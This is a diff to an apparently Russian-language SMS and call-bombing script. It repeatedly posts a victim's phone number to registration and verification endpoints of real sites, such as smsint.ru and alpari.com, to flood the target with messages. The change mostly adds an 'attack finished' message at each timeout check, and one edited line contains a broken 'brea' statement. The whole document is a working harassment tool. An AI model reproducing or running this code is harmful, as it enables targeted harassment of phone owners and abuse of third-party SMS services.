@@ -1505,7 +1798,11 @@ while True:
     except:
 
         print('[-] error in sent!')
-    if time.time() > start_time + float(CLOSE_AFTER): break  
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
+
 
     try:
 
@@ -1519,7 +1816,7 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+
 
     try:
 
@@ -1533,7 +1830,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1547,7 +1847,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1561,7 +1864,10 @@ while True:
 
         print('[+] не отправлено!')    
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1575,7 +1881,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1589,7 +1898,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1603,7 +1915,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1617,7 +1932,10 @@ while True:
 
         print('[-] Rutube in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1632,7 +1950,10 @@ while True:
         print('[-] не отправлено!')
 
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
     try:
 
         requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
@@ -1645,7 +1966,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1659,7 +1983,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1673,7 +2000,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break 
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1687,7 +2017,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1701,7 +2034,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1715,7 +2051,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1729,7 +2068,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1743,7 +2085,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1757,7 +2102,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1771,7 +2119,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1785,7 +2136,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1799,7 +2153,11 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
+
 
     try:
 
@@ -1813,7 +2171,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1827,7 +2188,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1841,7 +2205,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1855,7 +2222,10 @@ while True:
 
         print('[-] Звонок не отпрвлен !')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1869,7 +2239,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1883,7 +2256,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1897,7 +2273,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1911,7 +2290,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1925,7 +2307,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1939,7 +2324,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1953,7 +2341,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1967,7 +2358,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1981,7 +2375,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -1995,7 +2392,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2009,7 +2409,11 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break    
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
+
 
     try:
 
@@ -2023,7 +2427,10 @@ while True:
 
         print('[-] не отправлено!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2037,7 +2444,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2049,7 +2459,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2063,7 +2476,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2077,7 +2493,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2091,7 +2510,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2105,7 +2527,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2119,8 +2544,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
-
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
     try:
 
         requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
@@ -2133,7 +2560,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        brea
 
     try:
 
@@ -2147,7 +2577,10 @@ while True:
 
         print('[-] error in sent!')
 
-    if time.time() > start_time + float(CLOSE_AFTER): break
+    if time.time() > start_time + float(CLOSE_AFTER): 
+        print(Fore.RED)
+        print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+        break
 
     try:
 
@@ -2160,3 +2593,11 @@ while True:
     except:
 
         print('[-] error in sent!')
+
+
+    
+input()   
+
+        
+
+
